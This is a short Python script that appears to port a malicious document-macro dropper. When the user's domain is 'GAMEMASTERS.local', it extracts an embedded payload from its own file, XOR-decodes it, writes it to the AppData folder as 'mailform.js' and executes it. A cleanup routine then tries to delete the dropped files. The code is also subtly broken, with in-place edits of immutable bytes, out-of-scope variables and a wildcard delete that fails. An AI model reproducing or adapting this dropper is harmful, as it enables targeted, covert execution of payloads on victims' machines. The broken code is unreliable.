import os
import re

def JFqcfEGnc(given_string, length):
    xor_key = 45
    for i in range(length):
        given_string[i] = given_string[i] ^ xor_key
        xor_key = ((xor_key ^ 99) ^ (i % 254))
    return True

def AutoClose():
    try:
        os.remove(IAiiymixt)
        os.remove(os.path.join(kWXlyKwVj, "*.*"))
    except FileNotFoundError:
        pass

def AutoOpen():
    chkDomain = "GAMEMASTERS.local"
    strUserDomain = os.environ.get("UserDomain", "")
    if chkDomain != strUserDomain:
        return

    with open(__file__, "rb") as f:
        file_content = f.read()

    SwMbxtWpP = file_content.decode("utf-8")
    vTxAnSEFH = re.compile("sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa")
    I4j833DS5SFd34L3gwYQD = vTxAnSEFH.finditer(SwMbxtWpP)
    Y5t4Ul7o385qK4YDhr = None

    for match in I4j833DS5SFd34L3gwYQD:
        Y5t4Ul7o385qK4YDhr = match.start()
        break

    KDXl18qY4rcT = 13082
    Wk4o3X7x1134j = file_content[Y5t4Ul7o385qK4YDhr + 81: Y5t4Ul7o385qK4YDhr + 81 + KDXl18qY4rcT]
    
    if not JFqcfEGnc(Wk4o3X7x1134j, KDXl18qY4rcT + 1):
        return

    kWXlyKwVj = os.path.join(os.environ.get("appdata"), "Microsoft", "Windows")
    if not os.path.exists(kWXlyKwVj):
        kWXlyKwVj = os.environ.get("appdata")

    IAiiymixt = os.path.join(kWXlyKwVj, "mailform.js")
    with open(IAiiymixt, "wb") as f:
        f.write(Wk4o3X7x1134j)

    os.system(f'"{IAiiymixt}" vF8rdgMHKBrvCoCp0ulm')

AutoOpen()

